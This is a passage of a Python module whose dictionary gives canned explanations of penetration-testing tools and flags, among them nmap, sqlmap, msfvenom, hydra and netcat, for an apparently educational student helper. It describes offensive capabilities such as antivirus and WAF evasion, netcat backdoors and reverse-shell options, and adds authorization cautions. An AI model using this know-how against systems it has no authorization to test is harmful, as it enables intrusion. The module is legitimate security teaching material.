"""
This module contains comprehensive pattern-matched responses for all student helper commands,
enabling realistic demonstrations without requiring AI API calls.
"""

from __future__ import annotations
from typing import Dict, List, Tuple

# ============================================================================
# EXPLAIN DATABASE - 60+ tools and commands
# ============================================================================

EXPLAIN_DB: Dict[str, Dict[str, str]] = {
    # Network Scanning
    "nmap": {
        "base": "Network Mapper - powerful port scanner and service detection tool",
        "-sV": "Version detection: probe open ports to determine service/version info",
        "-sS": "SYN scan (stealth): send SYN packets without completing TCP handshake",
        "-sT": "TCP connect scan: complete TCP handshake (more reliable, less stealth)",
        "-sU": "UDP scan: check for open UDP ports (slow, often needs root)",
        "-Pn": "Skip ping: treat all hosts as online (bypass ICMP filtering)",
        "-A": "Aggressive scan: enables OS detection, version detection, script scanning, traceroute",
        "-T": "Timing template: T0 (paranoid) to T5 (insane), affects scan speed",
        "-p": "Port specification: -p 80,443 or -p- for all ports",
        "--script": "Run NSE (Nmap Scripting Engine) scripts for advanced detection",
        "-oN/-oX/-oG": "Output formats: normal, XML, greppable",
        "usage": "Use for: Initial reconnaissance, service enumeration, vulnerability detection",
        "caution": "Can trigger IDS/IPS. Start with -T2 or -T3 in shared environments"
    },

    "masscan": {
        "base": "Ultra-fast port scanner (faster than nmap for large ranges)",
        "-p": "Port specification: can scan all 65535 ports in minutes",
        "--rate": "Packet transmission rate (packets per second)",
        "-e": "Interface to use",
        "usage": "Use for: Quick discovery on large IP ranges, initial sweep",
        "caution": "Very noisy! Can crash weak network infrastructure. Use low rates in labs"
    },

    # Web Enumeration
    "gobuster": {
        "base": "Directory/file brute-forcing tool written in Go",
        "dir": "Directory brute-forcing mode",
        "dns": "DNS subdomain enumeration mode",
        "vhost": "Virtual host brute-forcing mode",
        "-u": "Target URL",
        "-w": "Wordlist path (e.g., /usr/share/wordlists/dirb/common.txt)",
        "-t": "Number of threads (default 10)",
        "-x": "File extensions to search for (e.g., -x php,html,txt)",
        "-k": "Skip SSL certificate verification",
        "-b": "Blacklist response codes (e.g., -b 404)",
        "usage": "Use for: Finding hidden endpoints, admin panels, backup files",
        "caution": "Generates significant traffic. Use small wordlists for stealth"
    },

    "ffuf": {
        "base": "Fast web fuzzer written in Go",
        "-u": "Target URL with FUZZ keyword placeholder",
        "-w": "Wordlist path",
        "-mc": "Match HTTP response codes",
        "-fc": "Filter HTTP response codes",
        "-fs": "Filter response size",
        "-t": "Number of threads",
        "-H": "Add custom header (e.g., -H \"Cookie: session=abc\")",
        "usage": "Use for: Directory fuzzing, parameter discovery, subdomain enumeration",
        "caution": "Very fast. Can overwhelm servers. Start with lower thread count"
    },

    "nikto": {
        "base": "Web server scanner that checks for dangerous files, outdated software, and misconfigurations",
        "-h": "Target host/URL",
        "-p": "Port to scan (default 80)",
        "-ssl": "Force SSL mode",
        "-Tuning": "Tune tests (1=interesting files, 2=misconfig, etc.)",
        "-nossl": "Disable SSL",
        "usage": "Use for: Quick vulnerability assessment, finding known issues",
        "caution": "Very noisy! Generates many requests. Not stealthy at all"
    },

    "dirb": {
        "base": "Web content scanner, older but reliable",
        "-a": "User agent string",
        "-r": "Don't search recursively",
        "-z": "Add millisecond delay between requests",
        "usage": "Use for: Directory enumeration (slower than gobuster but built-in wordlists)",
        "caution": "Slower than modern tools. Consider gobuster or ffuf for faster results"
    },

    "wpscan": {
        "base": "WordPress vulnerability scanner",
        "--url": "Target WordPress site",
        "--enumerate": "Enumerate (u=users, p=plugins, t=themes, vp=vulnerable plugins)",
        "--api-token": "WPScan API token for vulnerability data",
        "--force": "Force scan even if WordPress not detected",
        "usage": "Use for: WordPress site reconnaissance, plugin/theme enumeration",
        "caution": "Noisy scan. Can be detected by WAF/IPS"
    },

    # SQL Injection
    "sqlmap": {
        "base": "Automatic SQL injection and database takeover tool",
        "-u": "Target URL",
        "--data": "POST data string",
        "--cookie": "HTTP Cookie header value",
        "--dbs": "Enumerate databases",
        "--tables": "Enumerate tables",
        "--dump": "Dump table data",
        "--risk": "Risk level (1-3, higher = more dangerous tests)",
        "--level": "Level of tests (1-5, higher = more comprehensive)",
        "--batch": "Non-interactive mode (accept defaults)",
        "--technique": "SQL injection technique (B=Boolean, T=Time, E=Error, U=Union, S=Stacked)",
        "--tamper": "Use tamper scripts to evade WAF",
        "usage": "Use for: Automated SQLi testing and exploitation",
        "caution": "Very aggressive! Only use on authorized targets. Can modify database"
    },

    # Exploitation Frameworks
    "metasploit": {
        "base": "Comprehensive exploitation framework",
        "msfconsole": "Main Metasploit console interface",
        "search": "Search for exploits/modules",
        "use": "Select a module",
        "show options": "Display module options",
        "set": "Set option value",
        "exploit": "Run the exploit",
        "sessions": "List active sessions",
        "usage": "Use for: Exploitation, post-exploitation, payload generation",
        "caution": "Real exploitation! Ensure authorization. Can crash services"
    },

    "msfvenom": {
        "base": "Metasploit payload generator (replaces msfpayload and msfencode)",
        "-p": "Payload (e.g., windows/meterpreter/reverse_tcp)",
        "-f": "Output format (exe, elf, python, raw, etc.)",
        "LHOST": "Local IP for reverse connections",
        "LPORT": "Local port for reverse connections",
        "-e": "Encoder to use (for AV evasion)",
        "-i": "Number of encoding iterations",
        "-o": "Output file",
        "usage": "Use for: Creating custom payloads, AV evasion",
        "caution": "Generated payloads are for authorized testing only"
    },

    # Password Cracking
    "john": {
        "base": "John the Ripper - fast password cracker",
        "--wordlist": "Wordlist file (e.g., rockyou.txt)",
        "--rules": "Enable word mangling rules",
        "--format": "Hash format (e.g., md5, sha256, bcrypt)",
        "--show": "Show cracked passwords",
        "--incremental": "Brute-force mode",
        "--single": "Single crack mode (uses username variations)",
        "usage": "Use for: Password hash cracking, testing password strength",
        "caution": "CPU/GPU intensive. Can take hours to days"
    },

    "hashcat": {
        "base": "Advanced password recovery tool (GPU-accelerated)",
        "-m": "Hash type (0=MD5, 1000=NTLM, 3200=bcrypt, etc.)",
        "-a": "Attack mode (0=straight, 1=combination, 3=brute-force, 6=hybrid)",
        "-o": "Output file for cracked hashes",
        "--force": "Ignore warnings",
        "-w": "Workload profile (1=low, 2=default, 3=high, 4=nightmare)",
        "-r": "Rules file",
        "--show": "Show cracked passwords",
        "usage": "Use for: Fast GPU-based password cracking",
        "caution": "Requires GPU. Check hash mode list carefully"
    },

    "hydra": {
        "base": "Network logon cracker, supports many protocols",
        "-l": "Single username",
        "-L": "Username list file",
        "-p": "Single password",
        "-P": "Password list file",
        "-t": "Number of parallel tasks",
        "-V": "Verbose output",
        "-f": "Exit after first valid password found",
        "protocols": "Supports: ssh, ftp, http-post, http-get, smb, rdp, etc.",
        "usage": "Use for: Brute-forcing login credentials",
        "caution": "Noisy! Account lockouts are common. Use rate limiting"
    },

    # Wireless
    "aircrack-ng": {
        "base": "WiFi security auditing toolset",
        "airmon-ng": "Enable monitor mode on wireless interface",
        "airodump-ng": "Capture packets/IVs",
        "aireplay-ng": "Generate traffic, deauthenticate clients",
        "aircrack-ng": "Crack WEP and WPA/WPA2-PSK keys",
        "-w": "Wordlist for WPA cracking",
        "usage": "Use for: WiFi penetration testing, WPA/WEP cracking",
        "caution": "Monitor mode required. Legal restrictions on WiFi testing"
    },

    # Cryptography
    "hashid": {
        "base": "Identify hash types",
        "-m": "Show corresponding hashcat mode",
        "-j": "Show corresponding John the Ripper format",
        "usage": "Use for: Identifying unknown hash formats",
        "caution": "Educated guess only. Test with known plaintext to confirm"
    },

    "hash-identifier": {
        "base": "Python tool to identify hash types",
        "usage": "Use for: Interactive hash type identification",
        "caution": "Similar to hashid. Cross-reference results"
    },

    "openssl": {
        "base": "Cryptography toolkit and SSL/TLS library",
        "enc": "Encryption/decryption (e.g., openssl enc -aes-256-cbc)",
        "dgst": "Digest/hash functions",
        "s_client": "SSL/TLS client (test connections)",
        "x509": "X.509 certificate operations",
        "rsa": "RSA key operations",
        "usage": "Use for: Crypto operations, SSL testing, certificate inspection",
        "caution": "Powerful but complex syntax. Check man pages"
    },

    # Forensics
    "strings": {
        "base": "Extract printable strings from files",
        "-n": "Minimum string length (default 4)",
        "-a": "Scan entire file (not just text sections)",
        "-e": "Encoding (s=7-bit, S=8-bit, l=16-bit little-endian, b=16-bit big-endian)",
        "usage": "Use for: Quick file analysis, finding hardcoded credentials, URLs",
        "caution": "Can produce massive output on large binaries. Pipe to grep/less"
    },

    "binwalk": {
        "base": "Firmware analysis tool, extracts embedded files",
        "-e": "Extract embedded files",
        "-M": "Recursively extract",
        "-B": "Scan for common file signatures",
        "usage": "Use for: Firmware extraction, finding hidden files in binaries",
        "caution": "Can create many extracted files. Review before running -M"
    },

    "foremost": {
        "base": "File carving tool, recovers files based on headers/footers",
        "-i": "Input file",
        "-o": "Output directory",
        "-t": "File types (jpg, gif, png, pdf, doc, etc.)",
        "usage": "Use for: Recovering deleted files, extracting files from disk images",
        "caution": "Can recover many files. Specify output directory"
    },

    "volatility": {
        "base": "Memory forensics framework",
        "-f": "Memory dump file",
        "--profile": "OS profile (e.g., Win7SP1x64)",
        "imageinfo": "Identify image information",
        "pslist": "List processes",
        "netscan": "Scan for network connections",
        "filescan": "Scan for file objects",
        "usage": "Use for: Memory dump analysis, malware investigation",
        "caution": "Requires correct profile. Use imageinfo first"
    },

    "wireshark": {
        "base": "Network protocol analyzer with GUI",
        "filters": "Display filters (e.g., http, tcp.port==80, ip.addr==192.168.1.1)",
        "tshark": "Command-line version of Wireshark",
        "-r": "Read capture file",
        "-w": "Write capture file",
        "usage": "Use for: Network traffic analysis, protocol debugging",
        "caution": "Can capture sensitive data. Handle pcaps securely"
    },

    "tshark": {
        "base": "Terminal-based Wireshark",
        "-r": "Read from capture file",
        "-w": "Write to capture file",
        "-Y": "Display filter",
        "-i": "Capture interface",
        "-T": "Output format (text, json, xml)",
        "usage": "Use for: Automated packet analysis, scripting",
        "caution": "Less intuitive than GUI. Learn display filter syntax"
    },

    "tcpdump": {
        "base": "Command-line packet analyzer",
        "-i": "Interface to capture",
        "-w": "Write to file",
        "-r": "Read from file",
        "-n": "Don't resolve names",
        "-X": "Show packet contents in hex and ASCII",
        "usage": "Use for: Quick packet capture, network troubleshooting",
        "caution": "Requires root/admin privileges for capture"
    },

    # Reverse Engineering
    "ghidra": {
        "base": "NSA's software reverse engineering framework",
        "features": "Disassembler, decompiler, debugger, scripting",
        "usage": "Use for: Binary analysis, malware reverse engineering, vulnerability research",
        "caution": "Steep learning curve. Start with tutorials"
    },

    "radare2": {
        "base": "Reverse engineering framework (CLI-based)",
        "r2": "Main binary",
        "aaa": "Analyze all",
        "pdf": "Print disassembly of function",
        "V": "Visual mode",
        "usage": "Use for: Binary analysis, exploit development, debugging",
        "caution": "Complex commands. Use r2 -h and ? for help"
    },

    "gdb": {
        "base": "GNU Debugger",
        "run": "Start program",
        "break": "Set breakpoint",
        "continue": "Continue execution",
        "step": "Step one instruction",
        "print": "Print variable/expression",
        "x": "Examine memory",
        "info": "Info about program state",
        "usage": "Use for: Binary debugging, exploit development",
        "caution": "Learn peda/gef/pwndbg plugins for better experience"
    },

    # Privilege Escalation
    "linpeas": {
        "base": "Linux Privilege Escalation Awesome Script",
        "-a": "All checks",
        "-q": "Quiet mode",
        "usage": "Use for: Quick privilege escalation enumeration on Linux",
        "caution": "Generates significant output. Review carefully"
    },

    "winpeas": {
        "base": "Windows Privilege Escalation Awesome Script",
        "usage": "Use for: Windows privilege escalation enumeration",
        "caution": "May trigger AV. Use in controlled environments"
    },

    "sudo": {
        "base": "Execute command as another user (usually root)",
        "-l": "List allowed commands",
        "-u": "Run as specified user",
        "-s": "Run shell",
        "-E": "Preserve environment",
        "usage": "Use for: Executing privileged commands, testing sudo misconfigurations",
        "caution": "Check sudo -l output for NOPASSWD and dangerous binaries"
    },

    # Burp Suite
    "burp": {
        "base": "Web application security testing platform",
        "proxy": "Intercept and modify HTTP/S traffic",
        "repeater": "Manually manipulate and resend requests",
        "intruder": "Automated customized attacks",
        "scanner": "Automated vulnerability scanning (Pro only)",
        "decoder": "Encode/decode data",
        "comparer": "Visual diff tool",
        "usage": "Use for: Web app pentesting, API testing, manual testing",
        "caution": "Professional version required for scanner. Free version is feature-limited"
    },

    # Other Web Tools
    "curl": {
        "base": "Command-line tool for transferring data with URLs",
        "-X": "HTTP method (GET, POST, PUT, DELETE, etc.)",
        "-H": "Add header",
        "-d": "POST data",
        "-b": "Send cookies",
        "-c": "Save cookies",
        "-k": "Insecure (skip SSL verification)",
        "-v": "Verbose output",
        "-i": "Include response headers",
        "-o": "Output to file",
        "usage": "Use for: Testing APIs, downloading files, debugging HTTP",
        "caution": "URL encoding required for special characters"
    },

    "wget": {
        "base": "Network downloader",
        "-r": "Recursive download",
        "-np": "No parent (don't ascend to parent directory)",
        "-p": "Download page requisites (CSS, images, etc.)",
        "-k": "Convert links for local viewing",
        "-O": "Output filename",
        "usage": "Use for: Downloading files, mirroring websites",
        "caution": "Recursive downloads can consume significant disk space"
    },

    # Network Analysis
    "netcat": {
        "base": "Network Swiss Army knife (nc)",
        "-l": "Listen mode",
        "-p": "Port number",
        "-v": "Verbose",
        "-n": "No DNS resolution",
        "-e": "Execute command (dangerous!)",
        "usage": "Use for: Banner grabbing, simple file transfers, backdoors",
        "caution": "Many netcat variants exist. Check available flags"
    },

    "socat": {
        "base": "Advanced netcat alternative",
        "features": "SSL support, bidirectional transfers, port forwarding",
        "usage": "Use for: Complex network redirections, SSL tunnels",
        "caution": "Complex syntax. Check man page examples"
    },

    "ncat": {
        "base": "Modern netcat from nmap project",
        "--ssl": "Use SSL",
        "--broker": "Connection broker mode",
        "-e": "Execute command",
        "usage": "Use for: Improved netcat with SSL support",
        "caution": "Different syntax than traditional nc. Check -h"
    },

    # Enumeration
    "enum4linux": {
        "base": "Linux/Samba enumeration tool",
        "-a": "All simple enumeration",
        "-U": "Get userlist",
        "-S": "Get sharelist",
        "-P": "Get password policy",
        "usage": "Use for: Windows/Samba host enumeration",
        "caution": "Noisy! Generates many SMB connections"
    },

    "smbclient": {
        "base": "FTP-like client for SMB/CIFS",
        "-L": "List shares",
        "-N": "No password",
        "-U": "Username",
        "usage": "Use for: Accessing SMB shares, file transfer",
        "caution": "Check for null sessions (-N flag)"
    },

    "smbmap": {
        "base": "SMB share enumeration tool",
        "-H": "Host",
        "-u": "Username",
        "-p": "Password",
        "-d": "Domain",
        "usage": "Use for: Finding SMB shares and permissions",
        "caution": "Try null credentials first (guest access)"
    },

    "ldapsearch": {
        "base": "LDAP search tool",
        "-x": "Simple authentication",
        "-b": "Base DN",
        "-H": "LDAP URI",
        "-D": "Bind DN",
        "-w": "Bind password",
        "usage": "Use for: Active Directory enumeration, LDAP queries",
        "caution": "Anonymous bind often disabled. May need credentials"
    },

    "rpcclient": {
        "base": "MS-RPC client tool",
        "-U": "Username",
        "-N": "No password",
        "enumdomusers": "Enumerate domain users",
        "queryuser": "Query user info",
        "usage": "Use for: Windows RPC enumeration",
        "caution": "Limited by target ACLs. Try null session"
    },

    # Cloud
    "aws": {
        "base": "AWS CLI tool",
        "s3": "S3 bucket operations",
        "ec2": "EC2 instance management",
        "--profile": "Use named profile",
        "--region": "Specify region",
        "usage": "Use for: AWS resource management and enumeration",
        "caution": "Requires credentials. Check ~/.aws/credentials"
    },

    "gcloud": {
        "base": "Google Cloud CLI",
        "compute": "Compute Engine operations",
        "storage": "Cloud Storage operations",
        "projects": "Project management",
        "usage": "Use for: GCP resource management",
        "caution": "Requires authentication. Use gcloud auth login"
    },

    # Steganography
    "steghide": {
        "base": "Steganography tool for images/audio",
        "embed": "Hide data in file",
        "extract": "Extract hidden data",
        "-cf": "Cover file",
        "-ef": "Embed file",
        "-sf": "Stego file",
        "-p": "Passphrase",
        "usage": "Use for: Hiding/extracting data in images and audio files",
        "caution": "Password required for extraction if set during embed"
    },

    "stegsolve": {
        "base": "Java-based image steganography tool",
        "features": "Bit plane analysis, frame browser, data extraction",
        "usage": "Use for: Analyzing images for hidden data, LSB steganography",
        "caution": "Java required. GUI-based tool"
    },

    "exiftool": {
        "base": "Read/write meta information in files",
        "-a": "Allow duplicate tags",
        "-G": "Print group name for each tag",
        "usage": "Use for: Viewing/editing image metadata, finding hidden info",
        "caution": "Can modify files. Use carefully"
    },

    # Git
    "git": {
        "base": "Distributed version control system",
        "log": "Show commit history",
        "show": "Show commit details",
        "diff": "Show differences",
        "grep": "Search repository content",
        "usage": "Use for: Source code history analysis, finding secrets",
        "caution": "git log --all can reveal deleted commits with sensitive data"
    },

    "git-dumper": {
        "base": "Tool to dump exposed .git repositories",
        "usage": "Use for: Extracting source from exposed .git folders",
        "caution": "Only use on authorized targets"
    },

    # DNS
    "dig": {
        "base": "DNS lookup utility",
        "@": "Query specific nameserver",
        "ANY": "Request any record type",
        "axfr": "Zone transfer request",
        "usage": "Use for: DNS enumeration, zone transfers, subdomain discovery",
        "caution": "Zone transfers rarely work. Use DNSdumpster for reconnaissance"
    },

    "nslookup": {
        "base": "Query DNS nameservers",
        "usage": "Use for: Simple DNS queries",
        "caution": "Less powerful than dig. Use dig instead for advanced queries"
    },

    "host": {
        "base": "Simple DNS lookup utility",
        "-t": "Record type (A, MX, NS, TXT, etc.)",
        "usage": "Use for: Quick DNS lookups",
        "caution": "Limited compared to dig"
    },

    "dnsenum": {
        "base": "DNS enumeration tool",
        "--enum": "Enumerate",
        "-f": "File with subdomains",
        "--threads": "Number of threads",
        "usage": "Use for: Subdomain enumeration, zone transfer attempts",
        "caution": "Noisy! Generates many DNS queries"
    },

    # Web Security Tools - Proxies
    "burp suite": {
        "base": "Industry-standard web application security testing platform with comprehensive proxy, scanner, and manual testing tools",
        "proxy": "Intercept and modify HTTP/S traffic between browser and target",
        "repeater": "Manually manipulate and resend individual requests",
        "intruder": "Automated customized attacks with position markers and payload lists",
        "scanner": "Automated vulnerability scanning (Professional version only)",
        "decoder": "Encode/decode data in various formats (Base64, URL, HTML, etc.)",
        "comparer": "Visual diff tool to compare responses and find subtle differences",
        "extensions": "Extend functionality with BApp Store plugins",
        "usage": "Use for: Web app pentesting, API testing, manual security testing, traffic analysis",
        "caution": "Professional version required for scanner. Free version has limited features. Install CA certificate for HTTPS interception"
    },

    "owasp zap": {
        "base": "Free and open source web application security scanner with proxy capabilities",
        "proxy": "Intercept and modify HTTP/S traffic",
        "spider": "Automatically crawl web application to discover pages and functionality",
        "active scan": "Automated vulnerability scanning with customizable policies",
        "passive scan": "Analyze traffic for security issues without sending additional requests",
        "fuzzer": "Customizable fuzzing for parameter and input testing",
        "api": "REST API for integration with CI/CD pipelines",
        "usage": "Use for: Automated security testing, CI/CD integration, learning web security",
        "caution": "Can be noisy during active scanning. Configure scan policies appropriately for target environment"
    },

    "mitmproxy": {
        "base": "Interactive TLS-capable intercepting HTTP proxy for penetration testers and software developers",
        "web": "Web interface for traffic inspection and modification",
        "console": "Command-line interface for advanced users",
        "scripts": "Python scripting for automated traffic manipulation",
        "addons": "Extend functionality with custom Python addons",
        "ssl": "Built-in SSL/TLS certificate generation and management",
        "usage": "Use for: Traffic analysis, API testing, mobile app testing, automated proxy tasks",
        "caution": "Requires certificate installation on target devices. Use responsibly on authorized targets only"
    },

    "caido": {
        "base": "Modern web security testing platform with real-time traffic analysis and automated testing",
        "proxy": "High-performance HTTP/S proxy with real-time traffic capture",
        "replay": "Replay and modify captured requests",
        "scanning": "Automated vulnerability scanning with modern detection techniques",
        "api": "REST API for integration and automation",
        "collaboration": "Team features for sharing findings and workflows",
        "usage": "Use for: Modern web security testing, team collaboration, API security testing",
        "caution": "Commercial tool with subscription model. Ensure proper licensing for your use case"
    },

    "http toolkit": {
        "base": "Beautiful and open-source HTTP(S) debugging proxy, inspector, and repeater",
        "proxy": "Intercept and modify HTTP/S traffic with modern interface",
        "repeater": "Manually test and modify requests",
        "inspector": "Detailed analysis of HTTP headers, cookies, and responses",
        "mock": "Create mock responses for API testing",
        "usage": "Use for: API development, web debugging, security testing, learning HTTP",
        "caution": "Primarily designed for development. Use additional security tools for comprehensive testing"
    },

    # Web Security Tools - Scanners
    "nikto": {
        "base": "Web server scanner that checks for dangerous files, outdated software, and misconfigurations",
        "-h": "Target host/URL to scan",
        "-p": "Port to scan (default 80)",
        "-ssl": "Force SSL mode for HTTPS scanning",
        "-Tuning": "Tune tests (1=interesting files, 2=misconfig, 3=information disclosure, etc.)",
        "-nossl": "Disable SSL",
        "-C": "Include cookies in requests",
        "-useragent": "Custom user agent string",
        "usage": "Use for: Quick vulnerability assessment, finding known issues, initial reconnaissance",
        "caution": "Very noisy! Generates many requests. Not stealthy at all. Use on authorized targets only"
    },

    "wpscan": {
        "base": "WordPress vulnerability scanner that checks for vulnerable plugins, themes, and core issues",
        "--url": "Target WordPress site URL",
        "--enumerate": "Enumerate (u=users, p=plugins, t=themes, vp=vulnerable plugins, vt=vulnerable themes)",
        "--api-token": "WPScan API token for vulnerability database access",
        "--force": "Force scan even if WordPress not detected",
        "--stealthy": "Use stealth mode to avoid detection",
        "--update": "Update vulnerability database",
        "usage": "Use for: WordPress site reconnaissance, plugin/theme enumeration, vulnerability assessment",
        "caution": "Noisy scan. Can be detected by WAF/IPS. Requires API token for full vulnerability data"
    },

    "wapiti": {
        "base": "Web application vulnerability scanner that performs black-box testing",
        "-u": "Target URL to scan",
        "-m": "Modules to use (sql, xss, file, etc.)",
        "-f": "Output format (txt, xml, json, html)",
        "-o": "Output file",
        "--scope": "Define scan scope with regex patterns",
        "--auth": "Authentication configuration",
        "usage": "Use for: Automated web vulnerability scanning, comprehensive security assessment",
        "caution": "Can generate significant traffic. Configure scope appropriately. May trigger security alerts"
    },

    "arachni": {
        "base": "Feature-full, modular, high-performance Ruby framework aimed towards helping penetration testers and administrators evaluate the security of web applications",
        "webui": "Web-based user interface for scan management",
        "cli": "Command-line interface for automated scanning",
        "plugins": "Extensible plugin system for custom checks",
        "reports": "Multiple output formats (HTML, JSON, XML, etc.)",
        "usage": "Use for: Comprehensive web application security testing, custom vulnerability checks",
        "caution": "Resource intensive. Requires Ruby environment. Can be slow on large applications"
    },

    "skipfish": {
        "base": "Active web application security reconnaissance tool that prepares an interactive sitemap for the target site",
        "-o": "Output directory for results",
        "-S": "Dictionary file for content discovery",
        "-W": "Wordlist file for parameter fuzzing",
        "-C": "Cookie string for authenticated scanning",
        "-X": "Exclude URLs matching pattern",
        "usage": "Use for: Web application reconnaissance, sitemap generation, security assessment",
        "caution": "Can be resource intensive. May generate significant traffic. Use appropriate wordlists"
    },

    "nuclei": {
        "base": "Fast vulnerability scanner based on simple YAML templates for security testing",
        "-u": "Target URL to scan",
        "-l": "List of URLs from file",
        "-t": "Template file or directory",
        "-tags": "Execute templates with specific tags",
        "-severity": "Filter by severity (info, low, medium, high, critical)",
        "-rate-limit": "Rate limit requests per second",
        "usage": "Use for: Fast vulnerability scanning, custom template development, CI/CD integration",
        "caution": "Very fast scanner. Use rate limiting to avoid overwhelming targets. Keep templates updated"
    },

    "acunetix": {
        "base": "Commercial web vulnerability scanner with comprehensive testing capabilities",
        "features": "Automated scanning, manual testing tools, CI/CD integration, compliance reporting",
        "coverage": "Tests for OWASP Top 10, SANS Top 25, and custom vulnerabilities",
        "reporting": "Detailed reports with remediation guidance",
        "usage": "Use for: Enterprise security testing, compliance scanning, comprehensive vulnerability assessment",
        "caution": "Commercial license required. Expensive but comprehensive. Use for authorized testing only"
    },

    "nessus": {
        "base": "Commercial vulnerability scanner with web application testing modules",
        "web": "Web application scanning with specialized plugins",
        "compliance": "Compliance scanning for various standards",
        "reporting": "Comprehensive reporting with remediation guidance",
        "usage": "Use for: Enterprise vulnerability management, compliance scanning, comprehensive security assessment",
        "caution": "Commercial license required. Expensive but industry standard. Requires proper licensing"
    },

    # Web Security Tools - Directory/File Fuzzers
    "ffuf": {
        "base": "Fast web fuzzer written in Go with excellent performance and flexibility",
        "-u": "Target URL with FUZZ keyword placeholder",
        "-w": "Wordlist file path",
        "-mc": "Match HTTP response codes (e.g., -mc 200,204,301,302)",
        "-fc": "Filter HTTP response codes (e.g., -fc 404,403)",
        "-fs": "Filter response size (e.g., -fs 1234)",
        "-t": "Number of threads (default 40)",
        "-H": "Add custom header (e.g., -H \"Cookie: session=abc\")",
        "usage": "Use for: Directory fuzzing, parameter discovery, subdomain enumeration, content discovery",
        "caution": "Very fast. Can overwhelm servers. Start with lower thread count. Use rate limiting"
    },

    "wfuzz": {
        "base": "Web application fuzzer that can be used for finding resources not linked, bruteforcing GET and POST parameters, and more",
        "-w": "Wordlist file",
        "-c": "Colorize output",
        "-t": "Number of threads",
        "-s": "Delay between requests",
        "-H": "Add custom header",
        "-d": "POST data string",
        "usage": "Use for: Web application fuzzing, parameter discovery, directory brute-forcing",
        "caution": "Slower than ffuf but more feature-rich. Can generate significant traffic"
    },

    "dirbuster": {
        "base": "Java application designed to brute-force directories and files names on web/application servers",
        "gui": "Graphical user interface for easy configuration",
        "wordlists": "Built-in wordlists for common directories and files",
        "threading": "Multi-threaded scanning for faster results",
        "usage": "Use for: Directory enumeration, file discovery, web content scanning",
        "caution": "Older tool, slower than modern alternatives. Consider gobuster or ffuf for better performance"
    },

    "gobuster": {
        "base": "Directory/file brute-forcing tool written in Go with excellent performance",
        "dir": "Directory brute-forcing mode",
        "dns": "DNS subdomain enumeration mode",
        "vhost": "Virtual host brute-forcing mode",
        "-u": "Target URL",
        "-w": "Wordlist path (e.g., /usr/share/wordlists/dirb/common.txt)",
        "-t": "Number of threads (default 10)",
        "-x": "File extensions to search for (e.g., -x php,html,txt)",
        "usage": "Use for: Finding hidden endpoints, admin panels, backup files, subdomain enumeration",
        "caution": "Generates significant traffic. Use small wordlists for stealth. Consider rate limiting"
    },

    "feroxbuster": {
        "base": "Fast, simple, recursive content discovery tool written in Rust",
        "-u": "Target URL",
        "-w": "Wordlist file",
        "-t": "Number of threads",
        "-x": "File extensions to search for",
        "-s": "Status codes to include",
        "-f": "Status codes to filter out",
        "usage": "Use for: Fast directory enumeration, content discovery, web reconnaissance",
        "caution": "Very fast Rust-based tool. Use appropriate rate limiting. Can overwhelm targets"
    },

    # Web Security Tools - CMS Scanners
    "joomscan": {
        "base": "Joomla vulnerability scanner that checks for vulnerable components and configurations",
        "-u": "Target Joomla site URL",
        "-ec": "Enable component enumeration",
        "-ed": "Enable directory enumeration",
        "-ef": "Enable file enumeration",
        "usage": "Use for: Joomla site reconnaissance, component enumeration, vulnerability assessment",
        "caution": "Noisy scanner. Can be detected by WAF/IPS. Use on authorized targets only"
    },

    "droopescan": {
        "base": "Plugin-based scanner that identifies issues with several CMSs, mainly Drupal and Silverstripe",
        "drupal": "Drupal-specific vulnerability scanning",
        "silverstripe": "Silverstripe CMS scanning",
        "wordpress": "WordPress scanning capabilities",
        "usage": "Use for: CMS-specific vulnerability scanning, Drupal security assessment",
        "caution": "Focuses on specific CMSs. May not cover all vulnerability types. Use as part of comprehensive testing"
    },

    "cmsmap": {
        "base": "Open source Python CMS scanner that automates the process of detecting security flaws in the most popular CMSs",
        "wordpress": "WordPress vulnerability scanning",
        "joomla": "Joomla vulnerability scanning",
        "drupal": "Drupal vulnerability scanning",
        "usage": "Use for: Multi-CMS vulnerability scanning, automated CMS security assessment",
        "caution": "May generate significant traffic. Use appropriate rate limiting. Keep updated for latest vulnerabilities"
    },

    "whatweb": {
        "base": "Web scanner that identifies websites and their technologies",
        "-u": "Target URL",
        "-a": "Aggressive scan mode",
        "-v": "Verbose output",
        "--log": "Log results to file",
        "usage": "Use for: Technology fingerprinting, web technology identification, reconnaissance",
        "caution": "Passive reconnaissance tool. Generally safe to use. Good for initial target analysis"
    },

    # Web Security Tools - Specialized
    "sqlmap": {
        "base": "Automatic SQL injection and database takeover tool with comprehensive testing capabilities",
        "-u": "Target URL",
        "--data": "POST data string",
        "--cookie": "HTTP Cookie header value",
        "--dbs": "Enumerate databases",
        "--tables": "Enumerate tables",
        "--dump": "Dump table data",
        "--risk": "Risk level (1-3, higher = more dangerous tests)",
        "--level": "Level of tests (1-5, higher = more comprehensive)",
        "--batch": "Non-interactive mode (accept defaults)",
        "usage": "Use for: Automated SQLi testing and exploitation, database enumeration",
        "caution": "Very aggressive! Only use on authorized targets. Can modify database. Use --batch for automation"
    },

    "xsstrike": {
        "base": "Advanced XSS detection and exploitation tool with intelligent payload generation",
        "-u": "Target URL",
        "--data": "POST data string",
        "--headers": "Custom headers",
        "--crawl": "Crawl target for XSS vulnerabilities",
        "--blind": "Blind XSS testing mode",
        "usage": "Use for: XSS vulnerability detection, payload generation, XSS exploitation",
        "caution": "Can generate malicious payloads. Use only on authorized targets. May trigger security alerts"
    },

    "commix": {
        "base": "Automated command injection testing tool with comprehensive payload generation",
        "-u": "Target URL",
        "--data": "POST data string",
        "--cookie": "HTTP Cookie header value",
        "--os": "Target operating system",
        "--shell": "Reverse shell payload",
        "usage": "Use for: Command injection testing, OS command execution, shell access",
        "caution": "Can execute system commands. Use only on authorized targets. Very dangerous if misused"
    },

    "nosqlmap": {
        "base": "Automated NoSQL injection testing tool for MongoDB, CouchDB, and other NoSQL databases",
        "-u": "Target URL",
        "--data": "POST data string",
        "--cookie": "HTTP Cookie header value",
        "--method": "HTTP method (GET, POST, etc.)",
        "usage": "Use for: NoSQL injection testing, MongoDB security assessment",
        "caution": "Can access NoSQL databases. Use only on authorized targets. May modify database contents"
    },

    "ssrf sheriff": {
        "base": "Server-Side Request Forgery (SSRF) testing tool with comprehensive payload generation",
        "-u": "Target URL",
        "--data": "POST data string",
        "--headers": "Custom headers",
        "--payloads": "Custom payload file",
        "usage": "Use for: SSRF vulnerability testing, internal network scanning, cloud metadata access",
        "caution": "Can access internal services. Use only on authorized targets. May trigger security alerts"
    },

    "xxe injector": {
        "base": "XML External Entity (XXE) injection testing tool with comprehensive payload generation",
        "-u": "Target URL",
        "--data": "POST data string",
